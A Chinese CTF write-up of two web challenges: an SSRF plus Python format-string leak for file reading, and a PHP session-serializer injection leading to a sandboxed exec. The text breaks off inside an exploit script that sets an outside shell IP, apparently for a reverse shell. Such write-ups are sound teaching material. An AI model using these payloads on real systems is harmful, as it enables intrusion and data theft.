<h3 id="fmkq"><a href="#fmkq" class="headerlink" title="fmkq"></a>fmkq</h3><p>begin 那里搞个 %s% 就行了。</p>
<p>8080 出东西了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Welcome to our FMKQ api, you could use the help information below</span><br><span class="line">To read file:</span><br><span class="line">    /read/file=example&amp;vipcode=example</span><br><span class="line">    if you are not vip,let vipcode=0,and you can only read /tmp/&#123;file&#125;</span><br><span class="line">Other functions only for the vip!!!</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://121.37.179.47:1101/?begin=%s%&amp;head=\&amp;url=http://127.0.0.1:8080/read/file=/tmp/flag%26vipcode=1</span><br></pre></td></tr></table></figure>

<p>flag在 /未知目录/flag。至少能扫目录，或者直接 getshell</p>
<p><img src="https://i.loli.net/2020/03/08/qlPynLj3IOkZu9A.png" alt="image7052"></p>
<p>在fuzz过程中有一下报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Absolute URI not allowed if server is not a proxy.</span><br><span class="line">Malformed Request-Line: bad protocol</span><br><span class="line">Malformed Request-URI</span><br></pre></td></tr></table></figure>
<p>去网上查了下可能是cherrypy</p>
<p>当输入{file}时,其对应的输出为:error,说明可能有ssti或者格式化字符串漏洞</p>
<p>利用格式化字符串读取vipcode,从而任意文件读取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;file.__class__.__init__.__globals__&#125;</span><br><span class="line">[&#x27;lib&#x27;, &#x27;media&#x27;, &#x27;opt&#x27;, &#x27;var&#x27;, &#x27;usr&#x27;, &#x27;mnt&#x27;, &#x27;bin&#x27;, &#x27;root&#x27;, &#x27;home&#x27;, &#x27;tmp&#x27;, &#x27;boot&#x27;, &#x27;sys&#x27;, &#x27;run&#x27;, &#x27;sbin&#x27;, &#x27;srv&#x27;, &#x27;lib64&#x27;, &#x27;etc&#x27;, &#x27;dev&#x27;, &#x27;proc&#x27;, &#x27;app&#x27;, &#x27;.dockerenv&#x27;, &#x27;fl4g_1s_h3re_u_wi11_rua&#x27;]</span><br><span class="line"></span><br><span class="line">&#123;&#x27;truevipcode&#x27;: &#x27;3Ad8fya45bYeUOFDkJuXpjV1tGHLxzonrCWlER2mPKS9i67w&#x27;&#125;</span><br><span class="line">&#x27;__file__&#x27;: &#x27;/app/base/readfile.py&#x27;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?head=\&amp;url=http://127.0.0.1:8080/read/file=/etc/passwd%26vipcode=3Ad8fya45bYeUOFDkJuXpjV1tGHLxzonrCWlER2mPKS9i67w&amp;begin=%s%</span><br></pre></td></tr></table></figure>

<p>vip.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vipcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vip</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">global</span> vipcode</span><br><span class="line">        <span class="keyword">if</span> vipcode == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            vipcode = <span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters+string.digits, <span class="number">48</span>))</span><br><span class="line">            self.truevipcode = vipcode</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.truevipcode = vipcode</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetCode</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.truevipcode</span><br></pre></td></tr></table></figure>


<p>readfile.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> .vip <span class="keyword">import</span> vip</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,file</span>):</span></span><br><span class="line">        self.file = file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetName</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">readfile</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        filename = self.GetFileName()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;quanbumuda&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                file = <span class="built_in">open</span>(<span class="string">&quot;/tmp/&quot;</span> + filename, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                content = file.read()</span><br><span class="line">                file.close()</span><br><span class="line">                <span class="keyword">return</span> content</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">r&#x27;file=.*?&amp;vipcode=.*?&#x27;</span>,data) != <span class="literal">None</span>:</span><br><span class="line">            data = data.split(<span class="string">&#x27;&amp;&#x27;</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                data[<span class="number">0</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>]: data[<span class="number">0</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>],</span><br><span class="line">                data[<span class="number">1</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>]: data[<span class="number">1</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">                self.file = File(data[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;vipcode&#x27;</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">                self.vipcode = data[<span class="string">&#x27;vipcode&#x27;</span>]</span><br><span class="line">            self.vip = vip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">dir</span>(self) <span class="keyword">or</span> <span class="string">&#x27;vipcode&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">dir</span>(self) <span class="keyword">or</span> <span class="string">&#x27;vip&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">dir</span>(self):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isvip</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.vipcode == self.vip.GetCode():</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetFileName</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.file.GetName()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">current_folder_file = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vipreadfile</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,readfile</span>):</span></span><br><span class="line">        self.filename = readfile.GetFileName()</span><br><span class="line">        self.path = os.path.dirname(os.path.abspath(self.filename))</span><br><span class="line">        self.file = File(os.path.basename(os.path.abspath(self.filename)))</span><br><span class="line">        <span class="keyword">global</span> current_folder_file</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            current_folder_file = os.listdir(self.path)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            current_folder_file = current_folder_file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;fl4g&#x27;</span> <span class="keyword">in</span> self.path:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;nonono,this folder is a secret!!!&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output = <span class="string">&#x27;&#x27;&#x27;Welcome,dear vip! Here are what you want:\r\nThe file you read is:\r\n&#x27;&#x27;&#x27;</span></span><br><span class="line">            filepath = (self.path + <span class="string">&#x27;/&#123;vipfile&#125;&#x27;</span>).<span class="built_in">format</span>(vipfile=self.file)</span><br><span class="line">            output += filepath</span><br><span class="line">            output += <span class="string">&#x27;\r\n\r\nThe content is:\r\n&#x27;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f = <span class="built_in">open</span>(filepath,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                content = f.read()</span><br><span class="line">                f.close()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                content = <span class="string">&#x27;can\&#x27;t read&#x27;</span></span><br><span class="line">            output += content</span><br><span class="line">            output += <span class="string">&#x27;\r\n\r\nOther files under the same folder:\r\n&#x27;</span></span><br><span class="line">            output += <span class="string">&#x27; &#x27;</span>.join(current_folder_file)</span><br><span class="line">            <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure>

<p>app.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> web</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">from</span> base.readfile <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">urls = (</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;help&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/read/(.*)&#x27;</span>,<span class="string">&#x27;read&#x27;</span></span><br><span class="line">)</span><br><span class="line">web.config.debug = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">help</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GET</span>(<span class="params">self</span>):</span></span><br><span class="line">        help_information = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Welcome to our FMKQ api, you could use the help information below</span></span><br><span class="line"><span class="string">        To read file:</span></span><br><span class="line"><span class="string">            /read/file=example&amp;vipcode=example</span></span><br><span class="line"><span class="string">            if you are not vip,let vipcode=0,and you can only read /tmp/&#123;file&#125;</span></span><br><span class="line"><span class="string">        Other functions only for the vip!!!</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> help_information</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">read</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GET</span>(<span class="params">self,text</span>):</span></span><br><span class="line">        file2read = readfile(text)</span><br><span class="line">        <span class="keyword">if</span> file2read.test() == <span class="literal">False</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> file2read.isvip() == <span class="literal">False</span>:</span><br><span class="line">                <span class="keyword">return</span> (<span class="string">&quot;The content of &quot;</span>+ file2read.GetFileName() +<span class="string">&quot; is &#123;file&#125;&quot;</span>).<span class="built_in">format</span>(file=file2read)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                vipfile2read = vipreadfile(file2read)</span><br><span class="line">                <span class="keyword">return</span> (<span class="built_in">str</span>(vipfile2read))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = web.application(urls, <span class="built_in">globals</span>())</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>fl4g被过滤了,所以无法直接读flag</p>
<p>刚开始是想用fd/cwd来读取的,后来fuzz几下服务就炸掉了,所以我们换了个思路</p>
<p>通过拼接来绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f&#123;vipfile.__class__.__mro__[1].__new__.__doc__[39]&#125;4g_1s_h3re_u_wi11_rua/flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>flag{qoSF2nKvwoGRI7aJ}</p>
<h3 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h3><p>session引擎设置错误导致的反序列化</p>
<p><code>profile.php</code>处的<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code></p>
<p>其他地方基本都是<code>ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);</code></p>
<p>我们利用sign参数来写入恶意session</p>
<p>浏览代码发现,这里是我们的目的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;./init.php&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (check_session(<span class="variable">$_SESSION</span>)) &#123;</span><br><span class="line">    <span class="comment">#变成管理员吧，奥利给</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;只有管理员才能看到我哟&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_session</span>(<span class="params"><span class="variable">$session</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$session</span> <span class="keyword">as</span> <span class="variable">$keys</span> =&gt; <span class="variable">$values</span>) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$values</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$key</span> === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$value</span> === <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们最终要构造</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(</span><br><span class="line">	<span class="string">&#x27;xxxx&#x27;</span>:<span class="keyword">array</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>原本我们直接在<code>upload_sign.php</code>中post : <code>sigh[admin]=1</code>即可</p>
<p>但是<code>upload_sign.php</code>的session引擎是<code>ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);</code></p>
<p>而<code>core/index.php</code>的session引擎是:<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code></p>
<p>也就是说session是无法被正确解析的</p>
<blockquote>
<ul>
<li>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</li>
<li>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</li>
</ul>
</blockquote>
<p>根据php和php_serialize两个反序列化引擎的不同之处,我们构造</p>
<p><code>sign=|a%3A1%3A%7Bs%3A5%3A%22admin%22%3Bi%3A1%3B%7D</code></p>
<p>拿到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;./init.php&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (check_session(<span class="variable">$_SESSION</span>)) &#123;</span><br><span class="line">    <span class="comment">#hint : core/clear.php</span></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;./sandbox/&#x27;</span> . md5(<span class="string">&quot;Mrk@1xI^&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sandbox</span>;</span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    @chdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (filter_var(<span class="variable">$url</span>, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i&#x27;</span>, <span class="variable">$url</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you are hacker&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$res</span> = parse_url(<span class="variable">$url</span>);</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/127\.0\.0\.1$/&#x27;</span>, <span class="variable">$res</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="variable">$code</span> = file_get_contents(<span class="variable">$url</span>);</span><br><span class="line">                    <span class="keyword">if</span> (strlen(<span class="variable">$code</span>) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">                        @exec(<span class="variable">$code</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;try again&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;invalid url&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;只有管理员才能看到我哟&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>用<code>compress.zlib://data:@127.0.0.1/plain;base64,xxx</code>来代替data协议</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> random,base64,requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">shell_ip = <span class="string">&#x27;39.108.164.219&#x27;</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 将shell_IP转换成十六进制</span></span><br><span class="line">ip = <span class="string">&#x27;0x&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(i))[<span class="number">2</span>:].zfill(<span class="number">2</span>))</span><br><span class="line">                     <span class="keyword">for</span> i <span class="keyword">in</span> shell_ip.split(<span class="string">&#x27;.&#x27;</span>)])</span><br><span class="line"> </span><br><span class="line"><span class="comment"># payload某些位置的可选字符</span></span><br><span class="line">pos0 = <span class="string">&#x27;f&#x27;</span></span><br><span class="line">pos1 = <span class="string">&#x27;k&#x27;</span></span><br><span class="line">pos2 = <span class="string">&#x27;g&#x27;</span>  <span class="comment"># 随意选择字符</span></span><br><span class="line"> </span><br><span class="line">payload = [</span><br><span class="line">    <span class="string">&#x27;&gt;dir&#x27;</span>,</span><br><span class="line">    <span class="comment"># 创建名为 dir 的文件</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;&gt;%s\\&gt;&#x27;</span> % pos0,</span><br><span class="line">    <span class="comment"># 假设pos0选择 f , 创建名为 f&gt; 的文件</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;&gt;%st-&#x27;</span> % pos1,</span><br><span class="line">    <span class="comment"># 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，</span></span><br><span class="line">    <span class="comment"># 因为alphabetical序中t&gt;s</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;&gt;sl&#x27;</span>,</span><br><span class="line">    <span class="comment"># 创建名为 &gt;sl 的文件；到此处有四个文件，</span></span><br><span class="line">    <span class="comment"># ls 的结果会是：dir f&gt; kt- sl</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;*&gt;v&#x27;</span>,</span><br><span class="line">    <span class="comment"># 前文提到， * 相当于 `ls` ，那么这条命令等价于 `dir f&gt; kt- sl`&gt;v ，</span></span><br><span class="line">    <span class="comment">#  前面提到dir是不换行的，所以这时会创建文件 v 并写入 f&gt; kt- sl</span></span><br><span class="line">    <span class="comment"># 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符</span></span><br><span class="line"> </span><br><span class="line">    <span 